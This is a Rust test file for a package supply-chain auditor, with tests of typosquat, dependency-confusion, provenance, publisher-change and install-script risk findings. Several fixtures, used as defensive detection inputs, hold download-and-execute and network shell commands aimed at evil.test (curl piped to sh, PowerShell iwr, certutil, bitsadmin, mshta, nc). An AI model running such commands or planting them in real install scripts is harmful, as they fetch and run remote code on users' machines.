use super::*;
use crate::model::Confidence;
use crate::model::InstallScript;
use crate::osv::{Advisory, AdvisoryList};

const NOW: i64 = 1_800_000_000; // 2027-01-15

fn meta() -> PackageMeta {
    PackageMeta {
        public: Default::default(),
        name: "some-package".to_string(),
        version: "1.0.0".to_string(),
        first_published_at: Some(NOW - 400 * date::SECONDS_PER_DAY),
        published_at: Some(NOW - 100 * date::SECONDS_PER_DAY),
        maintainers: vec!["alice".to_string()],
        publisher: Some("alice".to_string()),
        install_scripts: vec![],
        build_from_source: false,
        maintainers_known: true,
        repository: Some("https://github.com/alice/some-package".to_string()),
        deprecated: None,
        provenance: crate::model::Provenance::Unavailable,
        attestation_subject_matches: None,
        attestation: None,
        registry_url: "https://registry.npmjs.org/some-package".to_string(),
        review_url: None,
        latest_version: None,
        candidate_weekly_downloads: None,
        release: crate::registry::ReleaseHistory::default(),
        scorecard: None,
        license: None,
    }
}

fn ids(findings: &[Finding]) -> Vec<&'static str> {
    findings.iter().map(|finding| finding.id).collect()
}

fn finding<'a>(findings: &'a [Finding], id: &str) -> &'a Finding {
    findings
        .iter()
        .find(|finding| finding.id == id)
        .unwrap_or_else(|| panic!("missing finding {id}"))
}

fn fixed_advisory(id: &str, fixed: &[&str]) -> Advisory {
    Advisory {
        id: id.to_string(),
        summary: "a real vulnerability".to_string(),
        severity: Severity::High,
        aliases: Vec::new(),
        url: format!("https://osv.dev/vulnerability/{id}"),
        fixed_versions: fixed.iter().map(|version| version.to_string()).collect(),
        details_missing: false,
        epss: None,
        kev: None,
    }
}

fn advice_report(meta: PackageMeta, advisories: Option<&AdvisoryList>) -> PackageReport {
    super::report(
        meta,
        Ecosystem::Npm,
        None,
        advisories,
        &[],
        Profile::NPM,
        NOW,
    )
}

#[test]
fn advisory_advice_prefers_the_fixed_version_on_the_audited_major() {
    let mut meta = meta();
    meta.version = "2.1.0".to_string();
    meta.latest_version = Some("3.0.0".to_string());
    let list = AdvisoryList {
        advisories: vec![fixed_advisory("GHSA-a", &["1.2.3", "2.0.1"])],
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    };

    let report = advice_report(meta, Some(&list));
    let upgrade = &report.upgrades[0];
    assert_eq!(
        upgrade.fixed,
        vec!["2.0.1".to_string(), "1.2.3".to_string()]
    );
    assert_eq!(upgrade.newest.as_deref(), Some("3.0.0"));
    assert_eq!(upgrade.fixes, vec!["GHSA-a".to_string()]);
    assert!(!upgrade.fix_unknown);
}

#[test]
fn no_fix_published_is_not_unknown() {
    let mut meta = meta();
    meta.latest_version = Some("2.0.0".to_string());
    let list = AdvisoryList {
        advisories: vec![fixed_advisory("GHSA-a", &[])],
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    };

    let report = advice_report(meta, Some(&list));
    let upgrade = &report.upgrades[0];
    assert!(upgrade.fixed.is_empty());
    assert!(!upgrade.fix_unknown);
    assert_eq!(upgrade.newest.as_deref(), Some("2.0.0"));
}

#[test]
fn an_unhydrated_advisory_is_unknown_not_unfixed() {
    let list = AdvisoryList {
        advisories: vec![Advisory {
            id: "GHSA-x".to_string(),
            summary: "OSV did not return details for this advisory".to_string(),
            severity: Severity::Warn,
            aliases: Vec::new(),
            url: "https://osv.dev/vulnerability/GHSA-x".to_string(),
            fixed_versions: Vec::new(),
            details_missing: true,
            epss: None,
            kev: None,
        }],
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    };

    let report = advice_report(meta(), Some(&list));
    let upgrade = &report.upgrades[0];
    assert!(upgrade.fix_unknown);
    assert!(upgrade.fixed.is_empty());
}

#[test]
fn a_mixed_unknown_advisory_is_not_listed_as_fixed() {
    let list = AdvisoryList {
        advisories: vec![
            fixed_advisory("GHSA-fixed", &["2.0.1"]),
            Advisory {
                id: "GHSA-unknown".to_string(),
                summary: "OSV did not return details for this advisory".to_string(),
                severity: Severity::Warn,
                aliases: Vec::new(),
                url: "https://osv.dev/vulnerability/GHSA-unknown".to_string(),
                fixed_versions: Vec::new(),
                details_missing: true,
                epss: None,
                kev: None,
            },
        ],
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    };

    let report = advice_report(meta(), Some(&list));
    let upgrade = &report.upgrades[0];
    assert_eq!(upgrade.fixed, vec!["2.0.1".to_string()]);
    assert!(upgrade.fix_unknown);
    assert_eq!(upgrade.fixes, vec!["GHSA-fixed".to_string()]);
}

#[test]
fn newest_equal_to_the_audited_version_is_dropped() {
    let mut meta = meta();
    meta.latest_version = Some(meta.version.clone());
    let list = AdvisoryList {
        advisories: vec![fixed_advisory("GHSA-a", &["2.0.0"])],
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    };

    let report = advice_report(meta, Some(&list));
    assert_eq!(report.upgrades[0].newest, None);
}

fn dormant(meta: &mut PackageMeta, published_days_ago: i64, previous_days_ago: i64) {
    meta.published_at = Some(NOW - published_days_ago * date::SECONDS_PER_DAY);
    meta.release.previous_published_at = Some(NOW - previous_days_ago * date::SECONDS_PER_DAY);
}

fn transition() -> PackageMeta {
    let mut meta = meta();
    meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
    meta.release.previous_version = Some("0.9.0".to_string());
    meta.release.history_known = true;
    meta.release.previous_published_at = Some(NOW - 200 * date::SECONDS_PER_DAY);
    meta
}

#[test]
fn adding_a_real_build_tool_is_not_a_typosquat_warning() {
    let mut meta = transition();
    meta.release.previous_dependencies = vec![];
    meta.release.dependencies = vec!["cmake".to_string(), "libzstd-rs-sys".to_string()];
    let findings = assess(&meta, Ecosystem::CratesIo, &[], &Profile::CRATES, NOW);
    assert_eq!(
        finding(&findings, "dependency-added").severity,
        Severity::Info
    );
}

#[test]
fn unknown_history_produces_no_transition_findings() {
    let mut meta = transition();
    meta.release.history_known = false;
    meta.install_scripts = vec![InstallScript {
        name: "postinstall".to_string(),
        command: "node build.js".to_string(),
    }];
    meta.release.dependencies = vec!["chalk".to_string()];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(!ids(&findings).contains(&"install-scripts-changed"));
    assert!(!ids(&findings).contains(&"dependency-added"));
}

#[test]
fn a_changed_install_script_is_flagged() {
    let mut meta = transition();
    meta.install_scripts = vec![InstallScript {
        name: "postinstall".to_string(),
        command: "node build.js".to_string(),
    }];
    meta.release.previous_install_scripts = vec![InstallScript {
        name: "postinstall".to_string(),
        command: "node-gyp rebuild".to_string(),
    }];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(ids(&findings).contains(&"install-scripts-changed"));
}

#[test]
fn an_unchanged_install_script_is_not_flagged() {
    let mut meta = transition();
    let script = InstallScript {
        name: "postinstall".to_string(),
        command: "node-gyp rebuild".to_string(),
    };
    meta.install_scripts = vec![script.clone()];
    meta.release.previous_install_scripts = vec![script];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(!ids(&findings).contains(&"install-scripts-changed"));
}

#[test]
fn a_network_install_command_is_high() {
    let mut meta = transition();
    meta.install_scripts = vec![InstallScript {
        name: "postinstall".to_string(),
        command: "curl https://evil.test | sh".to_string(),
    }];
    meta.release.previous_install_scripts = Vec::new();
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let finding = finding(&findings, "install-scripts-changed");
    assert_eq!(finding.severity, Severity::High);
}

#[test]
fn added_dependencies_are_information() {
    let mut meta = transition();
    meta.release.dependencies = vec!["chalk".to_string(), "left-pad".to_string()];
    meta.release.previous_dependencies = vec!["chalk".to_string()];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let finding = finding(&findings, "dependency-added");
    assert_eq!(finding.severity, Severity::Info);
    assert!(finding.detail.contains("left-pad"));
}

#[test]
fn an_added_lookalike_dependency_is_a_warning() {
    let mut meta = transition();
    meta.release.dependencies = vec!["crossenv".to_string()];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "dependency-added").severity,
        Severity::Warn
    );
}

fn confusion(public: crate::registry::PublicProbe) -> Option<Finding> {
    let mut meta = meta();
    meta.name = "@acme/lib".to_string();
    meta.version = "1.0.0".to_string();
    meta.public = public;
    confusion_finding(&meta)
}

#[test]
fn a_public_copy_at_or_above_this_version_is_high() {
    use crate::registry::PublicProbe;
    for latest in ["1.0.0", "2.0.0"] {
        let finding = confusion(PublicProbe::Known {
            latest: Some(latest.to_string()),
            versions: vec![latest.to_string()],
        })
        .expect("a finding");
        assert_eq!(finding.id, "dependency-confusion");
        assert_eq!(finding.severity, Severity::High, "{latest}");
    }
}

#[test]
fn a_public_copy_only_below_this_version_is_a_warning() {
    use crate::registry::PublicProbe;
    let finding = confusion(PublicProbe::Known {
        latest: Some("0.9.0".to_string()),
        versions: vec!["0.9.0".to_string()],
    })
    .expect("a finding");
    assert_eq!(finding.severity, Severity::Warn);
}

#[test]
fn an_absent_public_name_is_not_a_finding() {
    use crate::registry::PublicProbe;
    assert!(
        confusion(PublicProbe::Known {
            latest: None,
            versions: vec![],
        })
        .is_none()
    );
    assert!(confusion(PublicProbe::NotApplicable).is_none());
}

#[test]
fn a_failed_probe_is_information_not_silence() {
    use crate::registry::PublicProbe;
    let finding = confusion(PublicProbe::Unchecked).expect("a finding");
    assert_eq!(finding.id, "dependency-confusion-unchecked");
    assert_eq!(finding.severity, Severity::Info);
}

#[test]
fn a_four_letter_added_name_is_too_weak_to_accuse() {
    // `smallvec` 1.16.6 adds the real `unty` crate; one edit from `funty`.
    // Short names sit within one edit of half a 500-name seed, so the
    // escalation needs at least five characters to mean anything.
    let mut meta = transition();
    meta.release.previous_dependencies = vec![];
    meta.release.dependencies = vec!["unty".to_string()];
    let findings = assess(&meta, Ecosystem::CratesIo, &[], &Profile::CRATES, NOW);
    assert_eq!(
        finding(&findings, "dependency-added").severity,
        Severity::Info
    );
}

#[test]
fn unchanged_dependencies_produce_nothing() {
    let mut meta = transition();
    meta.release.dependencies = vec!["chalk".to_string()];
    meta.release.previous_dependencies = vec!["chalk".to_string()];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(!ids(&findings).contains(&"dependency-added"));
}

#[test]
fn a_release_burst_on_an_old_package_is_information() {
    let mut meta = meta();
    meta.release.recent_releases = 5;
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(ids(&findings).contains(&"release-burst"));

    meta.release.recent_releases = 4;
    assert!(
        !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW)).contains(&"release-burst")
    );

    let mut young = meta.clone();
    young.release.recent_releases = 8;
    young.first_published_at = Some(NOW - 30 * date::SECONDS_PER_DAY);
    assert!(
        !ids(&assess(&young, Ecosystem::Npm, &[], &Profile::NPM, NOW)).contains(&"release-burst")
    );
}

#[test]
fn a_repository_change_is_information_only_when_both_are_known() {
    let mut meta = meta();
    meta.repository = Some("https://github.com/new/home".to_string());
    meta.release.previous_repository = Some("https://github.com/old/home".to_string());
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(ids(&findings).contains(&"repository-changed"));

    meta.release.previous_repository = Some("https://github.com/new/home".to_string());
    assert!(
        !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"repository-changed")
    );

    let mut unknown = meta.clone();
    unknown.release.previous_repository = None;
    assert!(
        !ids(&assess(&unknown, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"repository-changed")
    );
}

#[test]
fn an_attestation_naming_another_repository_is_information() {
    let mut meta = meta();
    meta.repository = Some("https://github.com/alice/home".to_string());
    meta.attestation = Some(crate::model::AttestationClaims {
        build_type: None,
        builder: Some("https://github.com/actions/runner/github-hosted".to_string()),
        source_repository: Some("https://github.com/mallory/elsewhere".to_string()),
        source_commit: None,
        workflow: None,
        invocation: None,
    });
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "attestation-source-mismatch").severity,
        Severity::Info
    );

    // Same repo, spelled differently: no finding.
    meta.attestation.as_mut().unwrap().source_repository =
        Some("https://github.com/Alice/Home.git/".to_string());
    assert!(
        !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"attestation-source-mismatch")
    );

    // No declared repository, nothing to compare against.
    meta.repository = None;
    assert!(
        !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"attestation-source-mismatch")
    );
}

#[test]
fn an_attestation_for_another_artifact_is_high() {
    let mut meta = meta();
    meta.provenance = crate::model::Provenance::Present;
    meta.attestation_subject_matches = Some(false);
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "attestation-subject-mismatch").severity,
        Severity::High
    );

    for allowed in [Some(true), None] {
        meta.attestation_subject_matches = allowed;
        assert!(
            !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW))
                .contains(&"attestation-subject-mismatch")
        );
    }
}

#[test]
fn dropped_provenance_is_a_warning() {
    let mut meta = meta();
    meta.provenance = crate::model::Provenance::Missing;
    meta.release.previous_provenance = Some(true);
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "provenance-dropped").severity,
        Severity::Warn
    );

    meta.provenance = crate::model::Provenance::Present;
    assert!(
        !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"provenance-dropped")
    );

    meta.provenance = crate::model::Provenance::Missing;
    meta.release.previous_provenance = None;
    assert!(
        !ids(&assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"provenance-dropped")
    );
}

#[test]
fn a_release_after_a_year_of_silence_is_flagged() {
    let mut meta = meta();
    dormant(&mut meta, 10, 376);
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let finding = finding(&findings, "release-after-dormancy");
    assert_eq!(finding.severity, Severity::Info);
}

#[test]
fn dormancy_boundaries_are_exclusive() {
    let mut short = meta();
    dormant(&mut short, 10, 374);
    assert!(
        !ids(&assess(&short, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"release-after-dormancy")
    );

    let mut old = meta();
    dormant(&mut old, 31, 400);
    assert!(
        !ids(&assess(&old, Ecosystem::Npm, &[], &Profile::NPM, NOW))
            .contains(&"release-after-dormancy")
    );

    let mut no_history = meta();
    no_history.published_at = Some(NOW - 5 * date::SECONDS_PER_DAY);
    assert!(
        !ids(&assess(
            &no_history,
            Ecosystem::Npm,
            &[],
            &Profile::NPM,
            NOW
        ))
        .contains(&"release-after-dormancy")
    );
}

#[test]
fn a_lookalike_more_popular_than_its_target_is_not_a_typo() {
    let mut meta = meta();
    meta.name = "next".to_string();
    meta.candidate_weekly_downloads = Some(30_000_000);
    let report = super::report(
        meta,
        Ecosystem::Npm,
        Some(98_000_000),
        Some(&AdvisoryList::default()),
        &[],
        Profile::NPM,
        NOW,
    );
    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.id != "typosquat")
    );
}

#[test]
fn a_quiet_lookalike_is_still_flagged() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();
    meta.candidate_weekly_downloads = Some(30_000_000);
    let report = super::report(
        meta,
        Ecosystem::Npm,
        Some(20_000),
        Some(&AdvisoryList::default()),
        &[],
        Profile::NPM,
        NOW,
    );
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.id == "typosquat")
    );
}

#[test]
fn unknown_counts_fall_back_to_the_absolute_guard() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();
    let report = super::report(
        meta,
        Ecosystem::Npm,
        Some(2_000_000),
        Some(&AdvisoryList::default()),
        &[],
        Profile::NPM,
        NOW,
    );
    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.id != "typosquat")
    );
}

#[test]
fn an_old_one_edit_lookalike_is_still_flagged() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();
    meta.first_published_at = Some(NOW - 9 * 365 * date::SECONDS_PER_DAY);
    let report = super::report(
        meta,
        Ecosystem::Npm,
        Some(2_000),
        Some(&AdvisoryList::default()),
        &[],
        Profile::NPM,
        NOW,
    );
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.id == "typosquat")
    );
    assert_eq!(
        report.upgrades[0].replace_with.as_deref(),
        Some("cross-env")
    );
}

#[test]
fn a_six_year_old_name_is_not_an_accidental_typo() {
    let mut meta = meta();
    meta.name = "recat".to_string();
    meta.first_published_at = Some(NOW - 6 * 365 * date::SECONDS_PER_DAY);
    let report = super::report(
        meta,
        Ecosystem::Pypi,
        None,
        Some(&AdvisoryList::default()),
        &[],
        Profile::PYPI,
        NOW,
    );
    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.id != "typosquat")
    );
}

#[test]
fn an_established_package_is_never_a_typosquat() {
    let mut meta = meta();
    meta.name = "next".to_string();

    let report = super::report(
        meta,
        Ecosystem::Npm,
        Some(98_000_000),
        Some(&AdvisoryList::default()),
        &[],
        Profile::NPM,
        NOW,
    );

    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.id != "typosquat"),
        "next must not look like a typo: {:?}",
        report.findings
    );
    assert!(report.upgrades.is_empty(), "{:?}", report.upgrades);
}

#[test]
fn a_low_download_lookalike_is_still_flagged() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();

    let report = super::report(
        meta,
        Ecosystem::Npm,
        Some(1_200),
        Some(&AdvisoryList::default()),
        &[],
        Profile::NPM,
        NOW,
    );

    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.id == "typosquat")
    );
    assert_eq!(
        report.upgrades[0].replace_with.as_deref(),
        Some("cross-env")
    );
}

#[test]
fn install_scripts_alone_produce_no_advice() {
    let mut meta = meta();
    meta.latest_version = Some("9.9.9".to_string());
    meta.install_scripts.push(InstallScript {
        name: "postinstall".to_string(),
        command: "node setup.js".to_string(),
    });

    let report = advice_report(meta, Some(&AdvisoryList::default()));
    assert!(report.upgrades.is_empty());
}

#[test]
fn a_typosquat_suggests_the_real_package_and_no_version() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();

    let report = advice_report(meta, None);
    let upgrade = &report.upgrades[0];
    assert_eq!(upgrade.replace_with.as_deref(), Some("cross-env"));
    assert!(upgrade.fixed.is_empty());
    assert_eq!(upgrade.newest, None);
}

#[test]
fn a_typosquat_with_an_advisory_keeps_both_facts() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();
    let list = AdvisoryList {
        advisories: vec![fixed_advisory("GHSA-a", &["2.0.0"])],
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    };

    let report = advice_report(meta, Some(&list));
    let upgrade = &report.upgrades[0];
    assert_eq!(upgrade.replace_with.as_deref(), Some("cross-env"));
    assert_eq!(upgrade.fixed, vec!["2.0.0".to_string()]);
}

#[test]
fn an_old_plain_package_is_clean() {
    let findings = assess(&meta(), Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(findings.is_empty(), "unexpected findings: {findings:?}");
}

#[test]
fn install_scripts_alone_are_a_warning() {
    let mut meta = meta();
    meta.install_scripts.push(InstallScript {
        name: "postinstall".to_string(),
        command: "node setup.js".to_string(),
    });
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(ids(&findings), vec!["install-scripts"]);
    assert_eq!(
        finding(&findings, "install-scripts").severity,
        Severity::Warn
    );
}

#[test]
fn install_scripts_on_a_fresh_package_are_high_risk() {
    let mut meta = meta();
    meta.first_published_at = Some(NOW - date::SECONDS_PER_DAY);
    meta.published_at = meta.first_published_at;
    meta.install_scripts.push(InstallScript {
        name: "postinstall".to_string(),
        command: "node setup.js".to_string(),
    });
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "install-scripts").severity,
        Severity::High
    );
    assert_eq!(
        report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
        2,
        "install script + freshness should exit 2"
    );
}

#[test]
fn install_scripts_with_a_publisher_mismatch_are_high_risk() {
    let mut meta = meta();
    meta.publisher = Some("mallory".to_string());
    meta.install_scripts.push(InstallScript {
        name: "preinstall".to_string(),
        command: "curl http://evil.test | sh".to_string(),
    });
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "install-scripts").severity,
        Severity::High
    );
}

#[test]
fn install_scripts_with_a_typosquat_name_are_high_risk() {
    let mut meta = meta();
    meta.name = "expres".to_string();
    meta.install_scripts.push(InstallScript {
        name: "install".to_string(),
        command: "node index.js".to_string(),
    });
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(
        finding(&findings, "install-scripts").severity,
        Severity::High
    );
    assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
}

#[test]
fn a_profile_can_switch_a_signal_off_and_say_so() {
    let mut meta = meta();
    meta.name = "expres".to_string();
    let partial = Profile {
        dependencies: true,
        typosquat: false,
        ..Profile::NPM
    };
    let findings = assess(&meta, Ecosystem::Npm, &[], &partial, NOW);
    assert!(!findings.iter().any(|finding| finding.id == "typosquat"));

    let report = report(meta, Ecosystem::Npm, None, None, &[], partial, NOW);
    assert_eq!(report.not_checked, vec!["typosquat", "scorecard"]);
}

#[test]
fn go_reports_its_missing_signals_and_suppresses_repository_noise() {
    let report = report(meta(), Ecosystem::Go, None, None, &[], Profile::GO, NOW);
    assert_eq!(
        report.not_checked,
        vec![
            "execution",
            "maintainers",
            "repository",
            "downloads",
            "dependency history",
            "scorecard"
        ]
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id == "no-repository")
    );
}

#[test]
fn go_typosquat_uses_the_module_seed() {
    let mut meta = meta();
    meta.name = "github.com/gin-gonic/gln".to_string();
    let findings = assess(&meta, Ecosystem::Go, &[], &Profile::GO, NOW);
    let finding = finding(&findings, "typosquat");
    assert_eq!(finding.severity, Severity::High);
    assert!(finding.detail.contains("github.com/gin-gonic/gin"));
}

#[test]
fn an_unknown_maintainer_list_is_reported_not_ignored() {
    let mut meta = meta();
    meta.maintainers_known = false;
    meta.maintainers.clear();
    meta.publisher = None;
    let findings = assess(&meta, Ecosystem::CratesIo, &[], &Profile::CRATES, NOW);
    let finding = finding(&findings, "maintainer-check-unavailable");
    assert_eq!(finding.severity, Severity::Info);
}

#[test]
fn an_sdist_only_pypi_release_is_a_build_warning() {
    let mut meta = meta();
    meta.build_from_source = true;
    let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
    let finding = finding(&findings, "build-from-source");
    assert_eq!(finding.severity, Severity::Warn);
    assert!(finding.detail.contains("build backend"));
    assert_eq!(
        report(meta, Ecosystem::Pypi, None, None, &[], Profile::PYPI, NOW).exit_code(),
        1
    );
}

#[test]
fn pypi_reports_its_missing_signals() {
    let report = report(meta(), Ecosystem::Pypi, None, None, &[], Profile::PYPI, NOW);
    assert_eq!(
        report.not_checked,
        vec!["maintainers", "downloads", "scorecard"]
    );
    assert_eq!(report.ecosystem, Ecosystem::Pypi);
}

#[test]
fn pypi_typosquat_uses_the_pypi_seed() {
    let mut meta = meta();
    meta.name = "request".to_string();
    let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
    let finding = finding(&findings, "typosquat");
    assert_eq!(finding.severity, Severity::High);
    assert!(finding.detail.contains("requests"));
}

#[test]
fn npm_names_are_not_flagged_against_the_pypi_seed() {
    let mut meta = meta();
    meta.name = "expres".to_string();
    let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
    assert!(!findings.iter().any(|finding| finding.id == "typosquat"));
}

#[test]
fn a_typosquat_of_a_local_dependency_is_high_risk() {
    let mut meta = meta();
    meta.name = "crossenv".to_string();
    let local = vec!["cross-env".to_string()];
    let findings = assess(&meta, Ecosystem::Npm, &local, &Profile::NPM, NOW);
    let finding = finding(&findings, "typosquat");
    assert_eq!(finding.severity, Severity::High);
    assert!(finding.detail.contains("already in your lockfile"));
    assert_eq!(finding.evidence[1].label, "already installed");
}

#[test]
fn a_known_package_is_not_flagged_against_a_similar_local_one() {
    let mut meta = meta();
    meta.name = "preact".to_string();
    let local = vec!["react".to_string()];
    assert!(assess(&meta, Ecosystem::Npm, &local, &Profile::NPM, NOW).is_empty());
}

#[test]
fn a_new_package_is_a_warning() {
    let mut meta = meta();
    meta.first_published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
    meta.published_at = meta.first_published_at;
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(ids(&findings), vec!["fresh-package"]);
    assert_eq!(finding(&findings, "fresh-package").severity, Severity::Warn);
}

#[test]
fn a_package_exactly_seven_days_old_is_not_fresh() {
    let mut meta = meta();
    meta.first_published_at = Some(NOW - FRESH_DAYS * date::SECONDS_PER_DAY);
    meta.published_at = meta.first_published_at;
    assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
}

#[test]
fn a_recent_version_on_an_old_package_is_only_info() {
    let mut meta = meta();
    meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(ids(&findings), vec!["fresh-version"]);
    assert_eq!(finding(&findings, "fresh-version").severity, Severity::Info);
}

#[test]
fn future_timestamps_do_not_panic_or_alert() {
    let mut meta = meta();
    meta.first_published_at = Some(NOW + 400 * date::SECONDS_PER_DAY);
    meta.published_at = meta.first_published_at;
    assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
}

#[test]
fn a_different_existing_maintainer_is_information() {
    let mut meta = meta();
    meta.publisher = Some("bob".to_string());
    meta.maintainers = vec!["alice".to_string(), "bob".to_string()];
    meta.release.previous_publisher = Some("alice".to_string());
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let finding = finding(&findings, "publisher-changed");
    assert_eq!(finding.severity, Severity::Info);
    assert!(!ids(&findings).contains(&"publisher-not-maintainer"));
}

#[test]
fn a_publisher_new_to_history_is_called_out() {
    let mut meta = meta();
    meta.publisher = Some("bob".to_string());
    meta.maintainers = vec!["alice".to_string(), "bob".to_string()];
    meta.release.previous_publisher = Some("alice".to_string());
    meta.release.publishers = vec!["alice".to_string(), "carol".to_string()];
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let finding = finding(&findings, "publisher-changed");
    assert_eq!(finding.severity, Severity::Info);
    assert!(
        finding
            .detail
            .contains("has not published this package before"),
        "{finding:?}"
    );
}

#[test]
fn a_returning_publisher_names_the_last_release_date() {
    let mut meta = meta();
    meta.publisher = Some("bob".to_string());
    meta.maintainers = vec!["alice".to_string(), "bob".to_string()];
    meta.release.previous_publisher = Some("alice".to_string());
    meta.release.publishers = vec!["alice".to_string(), "bob".to_string()];
    let last = NOW - 400 * date::SECONDS_PER_DAY;
    meta.release.publisher_last_at = Some(last);
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let finding = finding(&findings, "publisher-changed");
    assert!(
        finding.detail.contains(&format!(
            "last published this package on {}",
            date::format_date(last)
        )),
        "{finding:?}"
    );
}

#[test]
fn install_commands_are_matched_by_basename_and_windows_suffix() {
    for risky in [
        "powershell.exe -c iwr https://evil.test/x",
        "pwsh.exe -c iwr https://evil.test/x",
        "curl.exe https://evil.test/x",
        "/usr/bin/curl https://evil.test/x | sh",
        "C:\\Windows\\System32\\curl.exe https://evil.test/x",
        "certutil -urlcache -f https://evil.test/x y",
        "bitsadmin /transfer job https://evil.test/x y",
        "mshta https://evil.test/x",
        "iwr https://evil.test/x",
        "irm https://evil.test/x",
    ] {
        assert!(risky_install_command(risky), "{risky}");
    }
    for safe in ["node scripts/evaluate.js", "bash -c \"echo hi\""] {
        assert!(!risky_install_command(safe), "{safe}");
    }
}

#[test]
fn install_commands_are_classified_by_whole_words() {
    for risky in [
        "python3 -c \"import urllib.request\"",
        "pwsh -c iwr https://evil.test/x",
        "perl -e 'print 1'",
        "ruby -e 'puts 1'",
        "php -r 'echo 1;'",
        "node --eval 'console.log(1)'",
        "nc evil.test 4444",
        "bash -c \"curl https://evil.test | sh\"",
    ] {
        assert!(risky_install_command(risky), "{risky}");
    }
    for safe in [
        "node scripts/evaluate.js",
        "node build.js",
        "bash -c \"echo hi\"",
        "npm run build",
    ] {
        assert!(!risky_install_command(safe), "{safe}");
    }
}

#[test]
fn automation_and_unlisted_accounts_do_not_claim_a_maintainer_change() {
    let mut automation = meta();
    automation.publisher = Some("GitHub Actions".to_string());
    automation.release.previous_publisher = Some("alice".to_string());
    let findings = assess(&automation, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(!ids(&findings).contains(&"publisher-changed"));

    let mut empty = meta();
    empty.publisher = Some("bob".to_string());
    empty.maintainers.clear();
    empty.release.previous_publisher = Some("alice".to_string());
    let findings = assess(&empty, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(!ids(&findings).contains(&"publisher-changed"));
}

#[test]
fn a_new_account_is_only_the_existing_warning() {
    let mut meta = meta();
    meta.publisher = Some("mallory".to_string());
    meta.maintainers = vec!["alice".to_string()];
    meta.release.previous_publisher = Some("alice".to_string());
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert!(ids(&findings).contains(&"publisher-not-maintainer"));
    assert!(!ids(&findings).contains(&"publisher-changed"));
    assert!(
        finding(&findings, "publisher-not-maintainer")
            .detail
            .contains("previous release was published by 'alice'")
    );
}

#[test]
